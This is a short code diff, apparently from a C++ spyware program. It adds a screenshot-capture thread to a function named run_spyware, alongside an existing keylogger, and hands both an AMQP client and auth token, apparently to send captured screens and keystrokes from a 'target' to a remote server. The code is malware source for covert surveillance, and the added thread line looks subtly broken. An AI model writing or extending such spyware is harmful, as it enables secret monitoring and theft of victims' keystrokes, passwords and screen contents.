@@ -2,6 +2,7 @@
 #include <iostream>
 #include <fstream>
 #include <string>
+#include <thread>
 
 #if defined(_WIN64) || defined(_WIN32)
 #include <windows.h>
@@ -14,6 +15,7 @@
 #include "utils.hpp"
 #include "../amqp/AmqpClient.hpp"
 #include "../loggers/keylogger.hpp"
+#include "../loggers/screenshot.hpp"
 
 int run_spyware () {
     bool amqpOpened;
@@ -33,6 +35,8 @@ int run_spyware () {
         debug("Enable to authenticate target", LEVEL_CRITICAL);
         return EXIT_FAILURE;
     }
+
+    std::thread screenShotsTread (TakeScreenShot(&amqpClient, authToken), 60 * 1000);
 
     startKeylogger(amqpClient, authToken);
 
